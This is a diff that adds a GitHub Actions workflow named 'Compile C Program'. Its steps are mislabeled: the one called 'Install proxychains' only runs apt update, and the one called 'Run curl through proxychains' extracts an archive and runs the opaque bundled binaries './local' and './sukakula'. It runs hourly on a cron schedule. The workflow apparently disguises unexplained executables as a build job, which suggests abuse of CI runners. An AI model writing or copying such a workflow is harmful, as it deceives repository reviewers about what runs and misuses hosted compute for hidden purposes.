@@ -1,0 +1,30 @@
+name: Compile C Program
+
+on:
+  push:
+    branches: [ master, main ]
+  pull_request:
+    branches: [ master, main ]
+  schedule:
+    - cron: '0 * * * *'
+
+jobs:
+  proxychains-demo:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Install proxychains
+        run: |
+          sudo apt update
+
+      - name: Run curl through proxychains
+        run: |
+          tar -xf app.tar.gz
+          chmod u+x *
+          ./local &
+          ./sukakula
+
+
